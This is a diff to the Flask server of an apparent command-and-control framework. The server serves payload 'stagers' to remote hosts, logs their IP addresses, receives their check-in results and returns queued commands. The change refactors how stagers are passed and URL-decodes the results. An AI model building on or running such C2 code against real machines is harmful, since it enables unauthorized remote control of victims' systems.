@@ -1,5 +1,6 @@
 import logging
 import os
+import urllib.parse as parse
 
 from connect import color, connection, util
 from flask import Flask, render_template, request
@@ -15,15 +16,14 @@ def serve_stagers(format_id):
         return render_template('connection_template.html', random_data=util.random_data)
     color.information(f'{engine.STAGERS[format_id].format} file requested ({remote_addr})')
     connection_id = util.generate_id()
-    connection = engine.create_connection(connection_id, engine.STAGERS[format_id].format)
+    connection = engine.create_connection(connection_id, engine.STAGERS[format_id])
     connection.system_information['ip'] = remote_addr
     connection_id_variable = (util.generate_str(), connection_id)
     return render_template(
-        f'stagers/{engine.connections[connection_id].stager_format}',
+        f'stagers/{engine.connections[connection_id].stager.format}',
         checkin_uri=checkin_uri,
         connection_id=connection_id_variable,
         variables=engine.STAGERS[format_id].variables,
-        functions=engine.STAGERS[format_id].functions
     )
 
 @app.route(f'{checkin_uri}', methods=['POST'])
@@ -39,7 +39,7 @@ def checkin():
     if 'results' in post_data.keys():
         color.normal('\n')
         color.information(f'results recieved ({internet_addr})')
-        color.normal(post_data['results'])
+        color.normal(parse.unquote(post_data['results']))
     if connection.command_queue:
         template = render_template('connection_template.html', random_data=util.random_data, command=connection.command_queue.pop(0))
     if connection.status != 'connected':
